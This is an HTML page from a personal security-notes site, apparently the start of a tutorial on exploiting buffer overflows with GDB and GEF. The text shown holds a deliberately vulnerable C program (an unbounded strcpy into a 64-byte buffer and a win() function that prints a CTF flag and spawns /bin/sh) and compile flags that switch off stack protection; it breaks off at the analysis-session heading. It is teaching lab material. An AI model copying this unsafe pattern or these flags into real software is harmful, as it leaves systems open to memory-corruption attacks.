<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-reverse/gdb-gef-practical-examples" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.1">
<title data-rh="true">GDB GEF Practical Examples: 32-bit and 64-bit Buffer Overflow Exploitation | gl0bal01 | Notes &amp; Research</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://gl0bal01.com/reverse/gdb-gef-practical-examples"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="GDB GEF Practical Examples: 32-bit and 64-bit Buffer Overflow Exploitation | gl0bal01 | Notes &amp; Research"><meta data-rh="true" name="description" content="Hands-on examples using GDB with the GEF plugin to exploit 32-bit and 64-bit buffer overflow vulnerabilities. Includes step-by-step walkthroughs, sample code, and debugging tips."><meta data-rh="true" property="og:description" content="Hands-on examples using GDB with the GEF plugin to exploit 32-bit and 64-bit buffer overflow vulnerabilities. Includes step-by-step walkthroughs, sample code, and debugging tips."><meta data-rh="true" name="keywords" content="gdb,gef,buffer overflow,exploit development,32-bit,64-bit,reverse engineering,debugging,cybersecurity"><link data-rh="true" rel="icon" href="/icons/favicon.ico"><link data-rh="true" rel="canonical" href="https://gl0bal01.com/reverse/gdb-gef-practical-examples"><link data-rh="true" rel="alternate" href="https://gl0bal01.com/reverse/gdb-gef-practical-examples" hreflang="en"><link data-rh="true" rel="alternate" href="https://gl0bal01.com/reverse/gdb-gef-practical-examples" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://4X4QPM0QJE-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Reverse Engineering","item":"https://gl0bal01.com/reverse-engineering"},{"@type":"ListItem","position":2,"name":"Buffer Overflow Exploitation","item":"https://gl0bal01.com/reverse/gdb-gef-practical-examples"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="gl0bal01 | Notes &amp; Research RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="gl0bal01 | Notes &amp; Research Atom Feed">

<link rel="preconnect" href="https://www.google-analytics.com">
<link rel="preconnect" href="https://www.googletagmanager.com">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-NFE7MZ9S3P"></script>
<script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-NFE7MZ9S3P",{anonymize_ip:!0})</script>



<link rel="search" type="application/opensearchdescription+xml" title="gl0bal01 | Notes &amp; Research" href="/opensearch.xml">


<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Host+Grotesk:wght@600;700;800&amp;display=swap"><link rel="stylesheet" href="/assets/css/styles.017f04e3.css">
<script src="/assets/js/runtime~main.86314a16.js" defer="defer"></script>
<script src="/assets/js/main.71ae77db.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||"dark"),document.documentElement.setAttribute("data-theme-choice",t||"dark")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}(),document.documentElement.setAttribute("data-announcement-bar-initially-dismissed",function(){try{return"true"===localStorage.getItem("docusaurus.announcement.dismiss")}catch(t){}return!1}())</script><div id="__docusaurus"><link rel="preload" as="image" href="/icons/android-icon-48x48.png"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><div class="theme-announcement-bar announcementBar_mb4j" role="banner"><div class="announcementBarPlaceholder_vyr4"></div><div class="content_knG7 announcementBarContent_xLdY">üéâÔ∏è ‚≠êÔ∏è If you like this repo, give it a star and follow me on <a target="_blank" rel="noopener noreferrer" href="https://github.com/gl0bal01/">GitHub</a> ü•≥Ô∏è</div><button type="button" aria-label="Close" class="clean-btn close closeButton_CVFx announcementBarClose_gvF7"><svg viewBox="0 0 15 15" width="14" height="14"><g stroke="currentColor" stroke-width="3.1"><path d="M.75.75l13.5 13.5M14.25.75L.75 14.25"></path></g></svg></button></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/icons/android-icon-48x48.png" alt="gl0bal01" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/icons/android-icon-48x48.png" alt="gl0bal01" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">gl0bal01</b></a><a class="navbar__item navbar__link" href="/ai">Ai</a><a class="navbar__item navbar__link" href="/cyber">Cyber</a><a class="navbar__item navbar__link" href="/osint">Osint</a><a class="navbar__item navbar__link" href="/reverse-engineering">Reverse</a><a class="navbar__item navbar__link" href="/cheatsheets">Cheatsheets</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="navbar__item dropdown dropdown--hoverable dropdown--right"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">Links</a><ul class="dropdown__menu"><li><a class="dropdown__link" href="/blog/ctf-platforms-training">üé≠ Play &amp; Learn</a></li><li><a href="https://github.com/gl0bal01/" target="_blank" class="dropdown__link">Github<svg width="12" height="12" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li><a href="https://discord.gg/T5tc9Rq8DV" target="_blank" class="dropdown__link">Discord<svg width="12" height="12" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li><a href="https://start.me/u/gl0bal01" target="_blank" class="dropdown__link">Start.me<svg width="12" height="12" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li><li><a href="https://github.com/gl0bal01/bookmarklets" target="_blank" class="dropdown__link">Bookmarklets<svg width="12" height="12" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a></li></ul></div><a class="navbar__item navbar__link blog-button" href="/blog">Blog</a><a class="navbar__item navbar__link" href="/news">News</a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="Search (Meta+k)" aria-keyshortcuts="Meta+k"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="8" stroke="currentColor" fill="none" stroke-width="1.4"></circle><path d="m21 21-4.3-4.3" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">Search</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG menuWithAnnouncementBar_GW3s"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/ai"><span title="Ai" class="categoryLinkLabel_W154">Ai</span></a><button aria-label="Expand sidebar category &#x27;Ai&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/cyber"><span title="Cyber" class="categoryLinkLabel_W154">Cyber</span></a><button aria-label="Expand sidebar category &#x27;Cyber&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/osint"><span title="Osint" class="categoryLinkLabel_W154">Osint</span></a><button aria-label="Expand sidebar category &#x27;Osint&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" href="/reverse-engineering"><span title="Reverse Engineering" class="categoryLinkLabel_W154">Reverse Engineering</span></a><button aria-label="Collapse sidebar category &#x27;Reverse Engineering&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/reverse/gdb-gef-practical-guide"><span title="Debugging with GDB/GEF" class="linkLabel_WmDU">Debugging with GDB/GEF</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/reverse/gdb-gef-practical-examples"><span title="Buffer Overflow Exploitation" class="linkLabel_WmDU">Buffer Overflow Exploitation</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/reverse/binary-refinery-practical-guide"><span title="Binary Refinery Practical" class="linkLabel_WmDU">Binary Refinery Practical</span></a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/cheatsheets"><span title="Cheatsheets" class="categoryLinkLabel_W154">Cheatsheets</span></a><button aria-label="Expand sidebar category &#x27;Cheatsheets&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/reverse-engineering"><span>Reverse Engineering</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Buffer Overflow Exploitation</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>GDB GEF Practical Examples: 32-bit and 64-bit Buffer Overflow Exploitation</h1></header>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="example-1-32-bit-buffer-overflow-exploitation">Example 1: 32-bit Buffer Overflow Exploitation<a href="#example-1-32-bit-buffer-overflow-exploitation" class="hash-link" aria-label="Direct link to Example 1: 32-bit Buffer Overflow Exploitation" title="Direct link to Example 1: 32-bit Buffer Overflow Exploitation" translate="no">‚Äã</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="target-application-vuln32c">Target Application (vuln32.c)<a href="#target-application-vuln32c" class="hash-link" aria-label="Direct link to Target Application (vuln32.c)" title="Direct link to Target Application (vuln32.c)" translate="no">‚Äã</a></h3>
<p>Buffer Overflow Exploitation Examples (32-bit &amp; 64-bit)</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)">// vuln32.c - 32-bit vulnerable application</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token macro property directive-hash">#</span><span class="token macro property directive keyword" style="color:rgb(189, 147, 249);font-style:italic">include</span><span class="token macro property"> </span><span class="token macro property string" style="color:rgb(255, 121, 198)">&lt;stdio.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token macro property directive-hash">#</span><span class="token macro property directive keyword" style="color:rgb(189, 147, 249);font-style:italic">include</span><span class="token macro property"> </span><span class="token macro property string" style="color:rgb(255, 121, 198)">&lt;string.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token macro property directive-hash">#</span><span class="token macro property directive keyword" style="color:rgb(189, 147, 249);font-style:italic">include</span><span class="token macro property"> </span><span class="token macro property string" style="color:rgb(255, 121, 198)">&lt;stdlib.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">void</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">win</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">printf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;üéâ Congratulations! You&#x27;ve exploited the 32-bit binary!\n&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">printf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;üö© Flag: CTF{32bit_buffer_overflow_mastered}\n&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">system</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;/bin/sh&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">void</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">vulnerable_function</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">char</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain">input</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">char</span><span class="token plain"> buffer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">64</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">printf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;üìù Input received: %s\n&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> input</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">strcpy</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">buffer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> input</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain">  </span><span class="token comment" style="color:rgb(98, 114, 164)">// Vulnerable strcpy - no bounds checking</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">printf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;üìã Buffer contents: %s\n&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> buffer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">int</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">main</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">int</span><span class="token plain"> argc</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">char</span><span class="token plain"> </span><span class="token operator">*</span><span class="token plain">argv</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">argc </span><span class="token operator">!=</span><span class="token plain"> </span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token function" style="color:rgb(80, 250, 123)">printf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;Usage: %s &lt;input&gt;\n&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> argv</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">printf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;üéØ 32-bit Buffer Overflow Challenge\n&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">printf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;üìç Win function address: %p\n&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> win</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">vulnerable_function</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">argv</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token function" style="color:rgb(80, 250, 123)">printf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;‚úÖ Function returned normally\n&quot;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="compilation-and-setup">Compilation and Setup<a href="#compilation-and-setup" class="hash-link" aria-label="Direct link to Compilation and Setup" title="Direct link to Compilation and Setup" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Compile 32-bit vulnerable binary with debugging symbols</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gcc </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-m32</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-g</span><span class="token plain"> -fno-stack-protector </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-z</span><span class="token plain"> execstack -no-pie </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-o</span><span class="token plain"> vuln32 vuln32.c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Verify 32-bit compilation and security features</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token function" style="color:rgb(80, 250, 123)">file</span><span class="token plain"> vuln32</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gdb </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-q</span><span class="token plain"> vuln32</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="gef-analysis-session">GEF Analysis Session<a href="#gef-analysis-session" class="hash-link" aria-label="Direct link to GEF Analysis Session" title="Direct link to GEF Analysis Session" translate="no">‚Äã</a></h3>
